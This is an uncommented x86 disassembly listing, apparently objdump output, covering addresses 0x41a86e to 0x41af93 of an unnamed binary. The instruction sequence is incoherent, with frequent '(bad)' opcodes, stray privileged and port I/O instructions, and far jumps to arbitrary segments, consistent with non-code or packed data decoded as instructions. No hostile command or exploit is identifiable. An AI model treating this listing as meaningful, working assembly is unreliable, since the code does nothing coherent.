  41a86e:	add    DWORD PTR [edi],ebp
  41a870:	and    al,0xd5
  41a872:	cmc    
  41a873:	sub    eax,0x2055742e
  41a878:	out    0x34,eax
  41a87a:	add    eax,0x57a1a3ee
  41a87f:	add    dl,ch
  41a881:	test   DWORD PTR [ebp-0x4345cea2],esp
  41a887:	mov    al,ds:0xeac95f62
  41a88c:	fsubr  st,st(7)
  41a88e:	fidiv  WORD PTR [eax-0x44]
  41a891:	xor    eax,0x399b27cb
  41a896:	xchg   edi,eax
  41a897:	pop    edx
  41a898:	fmul   st(6),st
  41a89a:	adc    DWORD PTR [esi+edx*1-0x7b],ebp
  41a89e:	jae    0x41a86d
  41a8a0:	test   DWORD PTR [ebx-0x28],esp
  41a8a3:	xor    al,0x86
  41a8a5:	mov    ds:0xccf43779,eax
  41a8aa:	sbb    ah,BYTE PTR [esi+ecx*1]
  41a8ad:	and    edx,DWORD PTR [edi+0x12a941ac]
  41a8b3:	scas   al,BYTE PTR es:[edi]
  41a8b4:	add    ecx,DWORD PTR [eax-0x2ca20dae]
  41a8ba:	sub    eax,0x3527c0b9
  41a8bf:	fbstp  TBYTE PTR [ebp+0x2c27fcf4]
  41a8c5:	and    esi,DWORD PTR [edi]
  41a8c7:	mov    ss,eax
  41a8c9:	ficom  DWORD PTR [edi+0x25]
  41a8cc:	sub    esp,eax
  41a8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8cf:	mov    ds:0xea1db90f,al
  41a8d4:	xchg   ecx,eax
  41a8d5:	jmp    0x41a85f
  41a8d7:	xchg   esi,eax
  41a8d8:	rcr    BYTE PTR [edx+0x4b5ed215],cl
  41a8de:	retf   0x98f
  41a8e1:	pop    ebp
  41a8e2:	dec    esi
  41a8e3:	xchg   DWORD PTR [esi],edi
  41a8e5:	outs   dx,BYTE PTR ds:[esi]
  41a8e6:	add    cl,bh
  41a8e8:	popf   
  41a8e9:	pop    esi
  41a8ea:	loop   0x41a95b
  41a8ec:	dec    eax
  41a8ed:	in     al,dx
  41a8ee:	repnz adc BYTE PTR [edx+ebp*1],ah
  41a8f2:	scas   al,BYTE PTR es:[edi]
  41a8f3:	leave  
  41a8f4:	in     eax,0xfb
  41a8f6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a8f8:	in     eax,dx
  41a8f9:	shr    BYTE PTR [ebp+0x668bea91],cl
  41a8ff:	xlat   BYTE PTR ds:[bx]
  41a901:	sub    eax,0x7e04024b
  41a906:	mov    ebp,edx
  41a908:	dec    esp
  41a909:	mov    bh,0xf5
  41a90b:	xor    al,BYTE PTR [edx+0x6dff4022]
  41a911:	inc    edx
  41a912:	sub    al,0x58
  41a914:	ror    BYTE PTR [eax-0x7fa01be0],1
  41a91a:	push   edi
  41a91b:	mov    dh,bh
  41a91d:	das    
  41a91e:	hlt    
  41a91f:	popf   
  41a920:	repz cmc 
  41a922:	push   ds
  41a923:	mov    bl,0x3f
  41a925:	int    0xa8
  41a927:	fwait
  41a928:	xor    al,bl
  41a92a:	adc    DWORD PTR [ecx],eax
  41a92c:	lods   al,BYTE PTR ds:[esi]
  41a92d:	mov    BYTE PTR [edx-0x1d56e5d5],cl
  41a933:	sub    DWORD PTR [edx-0x2902bdb7],ecx
  41a939:	fidiv  WORD PTR [ebx]
  41a93b:	inc    ebx
  41a93c:	xchg   edx,eax
  41a93d:	mov    ch,0x78
  41a93f:	lahf   
  41a940:	mov    gs,eax
  41a942:	fdiv   QWORD PTR [ebp-0x12]
  41a945:	sti    
  41a946:	push   edi
  41a947:	add    bl,BYTE PTR [eax+0x60]
  41a94a:	cmp    eax,0x905a6ab0
  41a94f:	sub    bh,cl
  41a951:	ja     0x41a968
  41a953:	add    edx,DWORD PTR [ecx+ebp*4]
  41a956:	(bad)  
  41a957:	or     ch,BYTE PTR [esi-0x2f]
  41a95a:	and    BYTE PTR [esi-0x29],al
  41a95d:	mov    dh,0x89
  41a95f:	out    0xb3,al
  41a961:	sub    DWORD PTR [eax],esp
  41a963:	jb     0x41a910
  41a965:	and    DWORD PTR [ebx],ebp
  41a967:	mov    esi,0xf3a23b70
  41a96c:	add    ebp,DWORD PTR [eax-0x43]
  41a96f:	jo     0x41a9ca
  41a971:	mov    al,ds:0x1d74189e
  41a976:	and    BYTE PTR [ecx],dh
  41a978:	add    bl,BYTE PTR [ebp-0x763fa287]
  41a97e:	inc    esi
  41a97f:	fprem1 
  41a981:	xor    ebx,esi
  41a983:	add    eax,0x81fbdaa5
  41a988:	int3   
  41a989:	mov    es,ebp
  41a98b:	jae    0x41a9f3
  41a98d:	cdq    
  41a98e:	cmp    ah,BYTE PTR [eax]
  41a990:	cmc    
  41a991:	mov    ecx,ebp
  41a993:	ss call ebp
  41a996:	leave  
  41a997:	jmp    0x41a9cd
  41a999:	(bad)  
  41a99a:	pop    ds
  41a99b:	adc    edx,edi
  41a99d:	scas   al,BYTE PTR es:[edi]
  41a99e:	(bad)  
  41a99f:	mov    dl,0x60
  41a9a1:	enter  0xbc28,0x6
  41a9a5:	jbe    0x41a9ef
  41a9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9a8:	in     eax,0xe9
  41a9aa:	push   ds
  41a9ab:	pop    ss
  41a9ac:	jle    0x41a96d
  41a9ae:	call   0xa7ab:0x4bbe78e
  41a9b5:	fstp   DWORD PTR [ebp-0xf]
  41a9b8:	add    cl,bl
  41a9ba:	add    ah,BYTE PTR [ebx-0x4c399f4d]
  41a9c0:	das    
  41a9c1:	jmp    0x41aa1b
  41a9c3:	jb     0x41a9cb
  41a9c5:	leave  
  41a9c6:	stc    
  41a9c7:	mov    bl,0xf
  41a9c9:	adc    ebp,DWORD PTR cs:[ebx-0x41467cf9]
  41a9d0:	pop    es
  41a9d1:	mov    BYTE PTR [ebx-0x2],dl
  41a9d4:	out    0x79,al
  41a9d6:	(bad)
  41a9d9:	test   al,0x3f
  41a9db:	xlat   BYTE PTR ds:[ebx]
  41a9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9dd:	inc    ebx
  41a9de:	jo     0x41a99a
  41a9e0:	mov    dh,0x50
  41a9e2:	push   ebp
  41a9e3:	aas    
  41a9e4:	out    0xa6,al
  41a9e6:	pop    ss
  41a9e7:	inc    ecx
  41a9e9:	pop    edi
  41a9ea:	test   BYTE PTR [esi+0x1f],bl
  41a9ed:	xor    eax,0x5ce3714a
  41a9f2:	pop    ebx
  41a9f3:	jg     0x41aa3d
  41a9f5:	add    edi,DWORD PTR [eax-0x1f634523]
  41a9fb:	cmp    ecx,ebp
  41a9fd:	jmp    0xa036:0x816525d2
  41aa04:	stc    
  41aa05:	retf   
  41aa06:	sbb    ax,0x2edd
  41aa0a:	es mov ah,0x8a
  41aa0d:	or     al,0xac
  41aa0f:	mov    dh,0x5f
  41aa11:	and    al,0x3f
  41aa13:	stc    
  41aa14:	mov    bl,0xca
  41aa16:	sub    al,0xc1
  41aa18:	fidivr WORD PTR [ebx+0x7779ad41]
  41aa1e:	sub    BYTE PTR [esi+0x1861a145],0x92
  41aa25:	sbb    ebp,0xc35d56
  41aa2b:	cmp    edi,edx
  41aa2d:	inc    ebp
  41aa2e:	mov    ebx,0x75aba498
  41aa33:	push   ecx
  41aa34:	dec    esp
  41aa35:	or     ebx,DWORD PTR [ecx-0x3b2df599]
  41aa3b:	or     DWORD PTR [ebx+0x2cd92d0d],edx
  41aa41:	dec    ecx
  41aa42:	and    esp,DWORD PTR [ecx]
  41aa44:	xor    esi,DWORD PTR [ebp+ebx*4+0x53]
  41aa48:	inc    ecx
  41aa49:	push   ds
  41aa4a:	jo     0x41aa62
  41aa4c:	mov    ds:0x4e184c9,eax
  41aa51:	and    BYTE PTR [ebp-0x4426a423],bh
  41aa57:	gs or  al,bl
  41aa5a:	test   DWORD PTR [ebx-0x5e7fe5f8],0x56c82e00
  41aa64:	(bad)  
  41aa65:	push   esp
  41aa66:	cmp    eax,0x5db12c48
  41aa6b:	dec    ebp
  41aa6c:	jecxz  0x41aa87
  41aa6e:	push   ebp
  41aa6f:	pop    esi
  41aa70:	xchg   edx,eax
  41aa71:	aad    0x2f
  41aa73:	ja     0x41aa4c
  41aa75:	shr    BYTE PTR [eax],0x57
  41aa78:	dec    ecx
  41aa79:	mov    ah,0xd3
  41aa7b:	sahf   
  41aa7c:	or     al,0x4c
  41aa7e:	sbb    al,0x21
  41aa80:	add    dl,BYTE PTR [ebx]
  41aa82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa83:	sub    al,0x86
  41aa85:	(bad)  
  41aa86:	mov    eax,ds:0x689bbf9b
  41aa8b:	sub    al,0xe
  41aa8d:	cmp    ah,ch
  41aa8f:	xor    DWORD PTR [ecx],esi
  41aa91:	cmp    al,BYTE PTR [ebx]
  41aa93:	pop    esp
  41aa94:	push   ebp
  41aa95:	lods   eax,DWORD PTR ds:[esi]
  41aa96:	mov    bh,ah
  41aa98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa99:	(bad)  
  41aa9a:	xor    DWORD PTR [ecx-0x56c9e2e4],eax
  41aaa0:	push   0x1d370be8
  41aaa5:	and    al,dl
  41aaa7:	mov    ss,WORD PTR [eax]
  41aaa9:	xchg   ebx,eax
  41aaaa:	add    ah,BYTE PTR fs:[edx]
  41aaad:	iret   
  41aaae:	dec    ecx
  41aaaf:	call   0x6bb1e1d7
  41aab4:	xchg   esp,eax
  41aab5:	adc    al,BYTE PTR [esi+0x48]
  41aab8:	and    DWORD PTR [di-0x77],esp
  41aabc:	or     esi,DWORD PTR [eax+0x69]
  41aabf:	test   BYTE PTR [ecx-0x2a],0xb0
  41aac3:	(bad)  
  41aac4:	xor    eax,0x9c3527ae
  41aac9:	pop    esi
  41aaca:	fwait
  41aacb:	pop    esp
  41aacc:	add    dh,BYTE PTR [edx+edi*1-0x8]
  41aad0:	pop    eax
  41aad1:	(bad)  
  41aad2:	xchg   ebx,eax
  41aad3:	push   edi
  41aad4:	je     0x4398cf28
  41aada:	(bad)  
  41aadb:	ds jae 0x41ab1d
  41aade:	gs jecxz 0x41ab23
  41aae1:	mov    ebp,0x4232f34c
  41aae6:	mov    eax,0x2d4d46f7
  41aaeb:	jp     0x41aa9c
  41aaed:	imul   edx,DWORD PTR [esi-0x405c4d78],0xb8ac268a
  41aaf7:	lea    ebp,[esi]
  41aaf9:	repnz fdiv DWORD PTR [edi+0x71dc6000]
  41ab00:	out    0xdc,al
  41ab02:	jecxz  0x41aaae
  41ab04:	cli    
  41ab05:	push   edi
  41ab06:	sahf   
  41ab07:	sbb    ah,BYTE PTR [edi+eax*2+0x7f]
  41ab0b:	outs   dx,BYTE PTR ds:[esi]
  41ab0c:	adc    dh,ch
  41ab0e:	mov    ebp,0xd72bc530
  41ab13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab14:	pop    ecx
  41ab15:	jecxz  0x41aaf5
  41ab17:	push   0x1f
  41ab19:	je     0x41ab88
  41ab1b:	loop   0x41aaa4
  41ab1d:	mov    WORD PTR [edi+0xc],ds
  41ab20:	adc    BYTE PTR [edx],dh
  41ab22:	jecxz  0x41ab93
  41ab24:	xor    eax,0x29ac4680
  41ab29:	and    cl,BYTE PTR [ebx]
  41ab2b:	pop    edx
  41ab2c:	jmp    DWORD PTR [eax+0x54]
  41ab2f:	mov    ebx,DWORD PTR [eax]
  41ab31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab32:	add    BYTE PTR [edx-0x7850f40],ch
  41ab38:	pop    ecx
  41ab39:	clc    
  41ab3a:	add    edi,DWORD PTR [ebp+0x116cd3c2]
  41ab40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab41:	xor    dh,BYTE PTR [esp+ecx*8]
  41ab44:	adc    DWORD PTR ds:0x74b603c8,ebp
  41ab4a:	xchg   edi,eax
  41ab4b:	mov    esp,0xbd19de36
  41ab50:	dec    ecx
  41ab51:	call   0x12a8e2b2
  41ab56:	lahf   
  41ab57:	gs xchg esp,ebp
  41ab5a:	(bad)  
  41ab5b:	repnz lods al,BYTE PTR ds:[esi]
  41ab5d:	sbb    BYTE PTR [esp+eiz*8],ah
  41ab60:	mov    DWORD PTR [eax-0x11],eax
  41ab63:	xchg   ebx,eax
  41ab64:	icebp  
  41ab65:	cmp    ecx,ecx
  41ab67:	dec    edx
  41ab68:	test   BYTE PTR [esi+0x69d5de89],cl
  41ab6e:	dec    ebx
  41ab6f:	pop    esi
  41ab70:	mov    DWORD PTR [edx+0x79522b61],esp
  41ab76:	pop    esi
  41ab77:	rcl    BYTE PTR [edi+0x69],0x52
  41ab7b:	adc    edx,DWORD PTR ds:0x47d10c11
  41ab81:	and    dh,BYTE PTR [ebp+eiz*8-0x12]
  41ab85:	loope  0x41ab72
  41ab87:	xor    edi,DWORD PTR [ebx+0x215e4b8a]
  41ab8d:	sbb    al,0x28
  41ab8f:	or     al,0xdf
  41ab91:	adc    ecx,DWORD PTR [ecx-0x38]
  41ab94:	int3   
  41ab95:	ror    BYTE PTR [eax+0x3a],0x78
  41ab99:	or     DWORD PTR [esi],esp
  41ab9b:	add    ebp,DWORD PTR [ebx+0x1070be6]
  41aba1:	mov    WORD PTR [eax-0x417345b3],?
  41aba7:	fwait
  41aba8:	mov    ds:0x76b9783a,al
  41abad:	pop    ss
  41abae:	push   esi
  41abaf:	stos   BYTE PTR es:[edi],al
  41abb0:	jle    0x41ab3c
  41abb2:	xchg   esp,eax
  41abb3:	test   al,0x34
  41abb5:	sub    al,cl
  41abb7:	xchg   esp,eax
  41abb8:	and    BYTE PTR [ecx],dh
  41abba:	mov    dh,0x26
  41abbc:	call   FWORD PTR [eax+0x70]
  41abbf:	je     0x41ab5c
  41abc1:	push   0x234b244a
  41abc6:	push   ebx
  41abc7:	scas   al,BYTE PTR es:[edi]
  41abc8:	je     0x41ab53
  41abca:	xlat   BYTE PTR ds:[ebx]
  41abcb:	jnp    0x41abc8
  41abcd:	inc    ebx
  41abce:	call   0x6a0dc4b4
  41abd3:	dec    edi
  41abd4:	jg     0x41ac4d
  41abd6:	rcr    BYTE PTR [ebx-0x53],1
  41abd9:	mov    DWORD PTR [ecx-0x79],ecx
  41abdc:	push   0x79
  41abde:	push   cs
  41abdf:	imul   ebx,DWORD PTR [eax-0x67fda09e],0xfffffff4
  41abe6:	sbb    al,0xdb
  41abe8:	fsubr  st(3),st
  41abea:	loope  0x41abc1
  41abec:	test   DWORD PTR [ebp-0x4e],edi
  41abef:	sub    BYTE PTR ds:0xd034da8f,ah
  41abf5:	ds add edi,edi
  41abf8:	and    al,BYTE PTR [eax-0x45050ef4]
  41abfe:	cmp    al,0x5b
  41ac00:	inc    edi
  41ac01:	(bad)  
  41ac02:	(bad)  
  41ac04:	adc    al,0xaa
  41ac06:	mov    eax,0x70cda433
  41ac0b:	mov    WORD PTR [ecx-0x17f33ce0],?
  41ac11:	stos   DWORD PTR es:[edi],eax
  41ac12:	(bad)  
  41ac13:	and    al,0xe8
  41ac15:	into   
  41ac16:	mov    edi,0x3a1b0d88
  41ac1b:	pop    DWORD PTR [eax+eax*8-0x2b]
  41ac1f:	mov    ch,0x8a
  41ac21:	jp     0x41ac33
  41ac23:	into   
  41ac24:	scas   al,BYTE PTR es:[edi]
  41ac25:	inc    edx
  41ac26:	dec    esi
  41ac27:	or     eax,0x37882f61
  41ac2c:	adc    al,BYTE PTR [edx]
  41ac2e:	mov    bh,0x5e
  41ac30:	jg     0x41abb8
  41ac32:	pop    ebx
  41ac33:	outs   dx,BYTE PTR ds:[esi]
  41ac34:	clc    
  41ac35:	mov    al,0x31
  41ac37:	das    
  41ac38:	jl     0x41ac7a
  41ac3a:	aaa    
  41ac3b:	sub    ah,bh
  41ac3d:	ja     0x41ac21
  41ac3f:	dec    eax
  41ac40:	or     ah,ah
  41ac42:	and    DWORD PTR [ecx+0x90e1483],edi
  41ac48:	in     al,0xf0
  41ac4a:	sub    DWORD PTR [ecx+ebx*4+0x117847ec],ebp
  41ac51:	jmp    0x43e2:0x8b2e27fa
  41ac58:	mov    ecx,0x9ed2d453
  41ac5d:	xchg   edx,eax
  41ac5e:	sub    BYTE PTR [edi+0x30],0xf7
  41ac62:	dec    edx
  41ac63:	jp     0x41acbd
  41ac65:	out    dx,al
  41ac66:	push   es
  41ac67:	leave  
  41ac68:	jb     0x41ac4b
  41ac6a:	ja     0x41ac8d
  41ac6c:	(bad)  
  41ac6d:	fild   WORD PTR [ecx+0x45e4f719]
  41ac73:	rol    DWORD PTR [edx],0x39
  41ac76:	or     DWORD PTR [ebp+0x74],eax
  41ac79:	out    dx,eax
  41ac7a:	cld    
  41ac7b:	shl    ecx,1
  41ac7d:	jno    0x41acf8
  41ac7f:	adc    eax,0x896fa291
  41ac84:	test   eax,0xf9ee6258
  41ac89:	pop    ecx
  41ac8a:	aam    0x3b
  41ac8c:	enter  0x7a6a,0xf1
  41ac90:	sub    BYTE PTR [ecx+0x60],0x9a
  41ac94:	xor    DWORD PTR ss:[eax],esi
  41ac97:	sub    DWORD PTR [ebx],0xffffffad
  41ac9a:	push   ebp
  41ac9b:	and    esi,DWORD PTR [eax]
  41ac9d:	mov    al,0x62
  41ac9f:	and    al,0x9d
  41aca1:	clc    
  41aca2:	adc    eax,0x39b39bf9
  41aca7:	pop    edi
  41aca8:	sub    esp,ebp
  41acaa:	add    esi,esi
  41acac:	arpl   cx,sp
  41acae:	fisttp WORD PTR [ebp+ebx*8+0x1f6c1a]
  41acb5:	test   eax,0x100db186
  41acba:	ds nop
  41acbc:	ds xchg edx,eax
  41acbe:	mov    ds,WORD PTR [edi]
  41acc0:	push   cx
  41acc2:	mov    esi,DWORD PTR [edx+0x26]
  41acc5:	sbb    BYTE PTR [eax+0x610f417d],bh
  41accb:	scas   al,BYTE PTR es:[edi]
  41accc:	sub    eax,0x395b5679
  41acd1:	sar    DWORD PTR [ebx+eiz*1-0x3e85349],1
  41acd8:	push   es
  41acd9:	inc    edx
  41acda:	xchg   ebx,eax
  41acdb:	shr    BYTE PTR [esi+0x1c7193e7],cl
  41ace1:	mov    edi,0xccfe2722
  41ace6:	ret    0x250d
  41ace9:	aad    0x94
  41aceb:	into   
  41acec:	or     BYTE PTR [edi-0x21],ch
  41acef:	jecxz  0x41aceb
  41acf1:	sbb    al,BYTE PTR [edx+0x7c]
  41acf4:	sahf   
  41acf5:	pop    eax
  41acf6:	sub    ebp,DWORD PTR [eax-0x2e]
  41acf9:	sub    dl,BYTE PTR [edx-0x3ea11a5b]
  41acff:	jecxz  0x41ad2f
  41ad01:	push   ecx
  41ad02:	arpl   bx,bx
  41ad04:	dec    esi
  41ad05:	mov    ?,esi
  41ad07:	sbb    edx,eax
  41ad09:	cdq    
  41ad0a:	cmp    DWORD PTR [ecx],esp
  41ad0c:	sbb    al,0xc2
  41ad0e:	fwait
  41ad0f:	mov    esi,DWORD PTR [eax-0x2107a62f]
  41ad15:	lods   eax,DWORD PTR ds:[esi]
  41ad16:	inc    ecx
  41ad17:	(bad)  
  41ad18:	call   0x9732cd07
  41ad1d:	inc    ecx
  41ad1e:	sbb    ch,cl
  41ad20:	jmp    DWORD PTR [esi]
  41ad22:	jmp    0x41acd6
  41ad24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad25:	loope  0x41ad98
  41ad27:	xchg   esp,eax
  41ad28:	cmp    ch,BYTE PTR [eax]
  41ad2a:	push   edi
  41ad2b:	push   edi
  41ad2c:	mov    WORD PTR [eax+0x5e61c2bb],?
  41ad32:	sbb    al,0x9b
  41ad34:	movups xmm6,XMMWORD PTR [esi]
  41ad37:	inc    ebx
  41ad38:	call   0x904b2236
  41ad3d:	jecxz  0x41ad76
  41ad3f:	stos   DWORD PTR es:[edi],eax
  41ad40:	xchg   ebp,eax
  41ad41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad42:	in     al,0xd2
  41ad44:	fiadd  DWORD PTR [esi]
  41ad46:	jmp    0x7035:0x42fbf0c4
  41ad4d:	mov    dh,BYTE PTR [eax+0x60]
  41ad50:	xlat   BYTE PTR ds:[ebx]
  41ad51:	ja     0x41ad28
  41ad53:	pop    esi
  41ad54:	inc    esp
  41ad55:	out    0xd2,al
  41ad57:	pop    ds
  41ad58:	aaa    
  41ad59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad5a:	inc    ebx
  41ad5b:	arpl   WORD PTR [ebx+0x3aa66242],cx
  41ad61:	xor    ebp,ebp
  41ad63:	mov    ebx,0x67dee8be
  41ad68:	xor    dh,ah
  41ad6a:	jns    0x41ad9a
  41ad6c:	add    eax,0x6aa5864c
  41ad71:	and    al,0x2a
  41ad73:	xor    ax,0xe10a
  41ad77:	outs   dx,BYTE PTR ds:[esi]
  41ad78:	jle    0x41ad36
  41ad7a:	cs pushf 
  41ad7c:	lods   eax,DWORD PTR ds:[esi]
  41ad7d:	push   es
  41ad7e:	jge    0x41ad26
  41ad80:	aas    
  41ad81:	pop    ebp
  41ad82:	mov    edx,DWORD PTR [esi-0x7a]
  41ad85:	xchg   esp,eax
  41ad86:	mov    al,0x45
  41ad88:	add    ch,BYTE PTR ds:0x418acc3f
  41ad8e:	retf   
  41ad8f:	in     eax,dx
  41ad90:	test   eax,0x47abc012
  41ad95:	call   0x2193:0x3069688
  41ad9c:	pop    ebp
  41ad9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad9e:	int    0x7c
  41ada0:	retf   0xf4f6
  41ada3:	test   BYTE PTR [ecx],dh
  41ada5:	sbb    al,ch
  41ada7:	ss sub al,0xa5
  41adaa:	ret    
  41adab:	xchg   esp,eax
  41adac:	inc    ebp
  41adad:	iret   
  41adae:	das    
  41adaf:	ja     0x41ad81
  41adb1:	loope  0x41ae29
  41adb3:	daa    
  41adb4:	jno    0x41ae0d
  41adb6:	sbb    al,0x4c
  41adb8:	pushf  
  41adb9:	shr    DWORD PTR [edi],cl
  41adbb:	(bad)
  41adbe:	enter  0xba97,0x17
  41adc2:	sti    
  41adc3:	or     BYTE PTR [esi+edx*2],dh
  41adc6:	or     cl,BYTE PTR [edx-0x73]
  41adc9:	add    BYTE PTR [ebx+ecx*1+0xd],ah
  41adcd:	sbb    edi,DWORD PTR gs:[edi+0xb]
  41add1:	ins    BYTE PTR es:[edi],dx
  41add2:	jl     0x41ad9b
  41add4:	pop    ecx
  41add5:	dec    esi
  41add6:	dec    ebx
  41add7:	scas   eax,DWORD PTR es:[edi]
  41add8:	dec    esi
  41add9:	jae    0x41aded
  41addb:	imul   edi,DWORD PTR ds:0xcc0c949f,0x3625326d
  41ade5:	mov    al,ds:0xdd7fd452
  41adea:	cdq    
  41adeb:	sti    
  41adec:	inc    esp
  41aded:	fdivr  DWORD PTR [esi+0x6d]
  41adf0:	sbb    DWORD PTR [edx],edx
  41adf2:	aad    0xb0
  41adf4:	and    al,0x5d
  41adf6:	push   eax
  41adf7:	cmc    
  41adf8:	pop    ecx
  41adf9:	test   DWORD PTR [ecx-0x5c],esp
  41adfc:	stos   BYTE PTR es:[edi],al
  41adfd:	mov    ebp,0xbf4467a9
  41ae02:	and    al,al
  41ae04:	in     al,dx
  41ae05:	xchg   esp,eax
  41ae06:	fld    DWORD PTR [eax-0x66cf1c90]
  41ae0c:	xchg   esi,eax
  41ae0d:	iret   
  41ae0e:	ret    
  41ae0f:	gs or  al,0x4
  41ae12:	and    ecx,DWORD PTR [ebp+0x5e]
  41ae15:	mov    edx,0xb64e5f50
  41ae1a:	out    dx,al
  41ae1b:	jb     0x41ae9b
  41ae1d:	scas   eax,DWORD PTR es:[edi]
  41ae1e:	in     eax,0xad
  41ae20:	adc    BYTE PTR [edx],dl
  41ae22:	pop    eax
  41ae23:	mov    eax,ds:0x617cb40d
  41ae28:	dec    ecx
  41ae29:	mov    ch,0x3e
  41ae2b:	sbb    BYTE PTR [edi-0x1b],0x72
  41ae2f:	mov    al,dh
  41ae31:	jge    0x41ae5b
  41ae33:	xor    DWORD PTR [esi-0x2afc0e34],edx
  41ae39:	sahf   
  41ae3a:	push   cs
  41ae3b:	xor    BYTE PTR [edx],dh
  41ae3d:	xchg   edx,eax
  41ae3e:	pop    edi
  41ae3f:	fwait
  41ae40:	inc    edx
  41ae41:	loope  0x41ade7
  41ae43:	int    0xd9
  41ae45:	dec    esi
  41ae46:	lahf   
  41ae47:	push   edi
  41ae48:	and    bl,cl
  41ae4a:	xchg   esi,eax
  41ae4b:	sbb    edx,ecx
  41ae4d:	sub    eax,0xade1ec62
  41ae52:	daa    
  41ae53:	adc    bh,BYTE PTR [esi+eiz*4]
  41ae56:	test   DWORD PTR [ebx-0x7b],edi
  41ae59:	and    BYTE PTR [esi-0x30],ch
  41ae5c:	test   BYTE PTR [esi-0x4c],ch
  41ae5f:	pop    esp
  41ae60:	xor    al,0x4e
  41ae62:	pop    ebp
  41ae63:	dec    ecx
  41ae64:	inc    esp
  41ae65:	jbe    0x41aeb8
  41ae67:	xor    al,0x60
  41ae69:	xor    dl,BYTE PTR [esi+ebp*2-0xd]
  41ae6d:	sbb    ch,0x91
  41ae70:	push   esp
  41ae71:	lock iret 
  41ae73:	loope  0x41ae75
  41ae75:	xor    al,0xfe
  41ae77:	pop    ss
  41ae78:	add    eax,0x31dfbf8e
  41ae7d:	bound  esp,QWORD PTR [edi+0x79f0693e]
  41ae83:	xchg   ebx,eax
  41ae84:	dec    edi
  41ae85:	data16 sub al,0x9c
  41ae88:	lods   eax,DWORD PTR ds:[esi]
  41ae89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae8a:	xchg   ebp,eax
  41ae8b:	imul   eax
  41ae8d:	retf   
  41ae8e:	aad    0x60
  41ae90:	mov    al,0x13
  41ae92:	in     al,0xd5
  41ae94:	adc    BYTE PTR [edi+0x4efaf72f],bh
  41ae9a:	js     0x41ae81
  41ae9c:	pop    ecx
  41ae9d:	pop    eax
  41ae9e:	push   0x162e900d
  41aea3:	mov    ds:0x310cbffe,al
  41aea8:	or     bh,BYTE PTR [edx+0x3a6c7b3e]
  41aeae:	imul   ecx,DWORD PTR [edi],0x70b8c41e
  41aeb4:	and    DWORD PTR [edx+0x11732783],esi
  41aeba:	lods   eax,DWORD PTR ds:[esi]
  41aebb:	jmp    0x41ae45
  41aebd:	or     eax,edi
  41aebf:	pop    edx
  41aec0:	shr    BYTE PTR [edi+ebp*1+0x16],1
  41aec4:	mov    eax,0xc1e2f3aa
  41aec9:	or     ebx,DWORD PTR [edx]
  41aecb:	fadd   QWORD PTR [edi+0x29]
  41aece:	pop    esp
  41aecf:	xor    bl,BYTE PTR [eax]
  41aed1:	adc    ch,BYTE PTR [ecx+0x4dbefce7]
  41aed7:	add    BYTE PTR [ebx],bh
  41aed9:	retf   
  41aeda:	dec    esp
  41aedb:	inc    edi
  41aedc:	xchg   ecx,eax
  41aedd:	sar    ebp,cl
  41aedf:	xor    DWORD PTR [edx+0x6d45bd57],edx
  41aee5:	xor    ah,0xd2
  41aee8:	neg    DWORD PTR [edi-0x7ddfc9ac]
  41aeee:	clc    
  41aeef:	mov    esi,0x53c41435
  41aef4:	jmp    0x41aec5
  41aef6:	mov    bl,BYTE PTR [esi+0x3d7eeedc]
  41aefc:	ins    DWORD PTR es:[edi],dx
  41aefd:	push   es
  41aefe:	mov    esp,0x8293fce3
  41af03:	pop    ebp
  41af04:	xchg   esi,eax
  41af05:	inc    edx
  41af06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af07:	xchg   ebp,eax
  41af08:	mov    ds:0x2773e7a4,al
  41af0d:	out    dx,eax
  41af0e:	push   ecx
  41af0f:	add    dl,BYTE PTR [edx+0x74]
  41af12:	sub    ecx,DWORD PTR [edi]
  41af14:	cmp    edx,DWORD PTR [edx+esi*2-0x59f7c347]
  41af1b:	add    al,0x1d
  41af1d:	sbb    edx,ebx
  41af1f:	or     ebx,DWORD PTR [eax+0x55]
  41af22:	push   eax
  41af23:	sbb    al,0x74
  41af25:	dec    esi
  41af26:	mov    bl,0xfd
  41af28:	dec    esp
  41af29:	fwait
  41af2a:	stos   BYTE PTR es:[edi],al
  41af2b:	les    eax,FWORD PTR [eax-0x279cf4b4]
  41af31:	xchg   esi,eax
  41af32:	ret    0xbc29
  41af35:	cmc    
  41af36:	mov    bh,0xda
  41af38:	les    esi,FWORD PTR [edx+0x7d92fe1f]
  41af3e:	cmp    edi,DWORD PTR [edx]
  41af40:	cmc    
  41af41:	int    0x15
  41af43:	(bad)  
  41af44:	iret   
  41af45:	mov    WORD PTR [ecx-0x7],ds
  41af48:	hlt    
  41af49:	ins    DWORD PTR es:[edi],dx
  41af4a:	ret    0x5b47
  41af4d:	mov    BYTE PTR [edi-0x48c5c6a7],dl
  41af53:	push   ss
  41af54:	repnz call 0xfe04:0xcf459620
  41af5c:	fcmovu st,st(3)
  41af5e:	jno    0x41af61
  41af60:	(bad)  
  41af61:	pop    ebx
  41af62:	mov    ds,esi
  41af64:	mov    BYTE PTR [edi+0xe2103b1],cl
  41af6a:	fisub  WORD PTR [eax]
  41af6c:	call   FWORD PTR [eax-0x30]
  41af6f:	pushf  
  41af70:	div    BYTE PTR [edx-0x10]
  41af73:	mov    WORD PTR [esi],gs
  41af75:	pop    eax
  41af76:	mov    cl,0xc7
  41af78:	int    0x85
  41af7a:	dec    esp
  41af7b:	push   esp
  41af7c:	popa   
  41af7d:	mov    dh,0xb1
  41af7f:	mov    ah,0x20
  41af81:	call   0xbba7:0x55abe2b9
  41af88:	or     BYTE PTR [eax-0x3d292b2],0xb3
  41af8f:	push   es
  41af90:	fcomp  DWORD PTR [eax+edi*1]
  41af93:	dec    esi
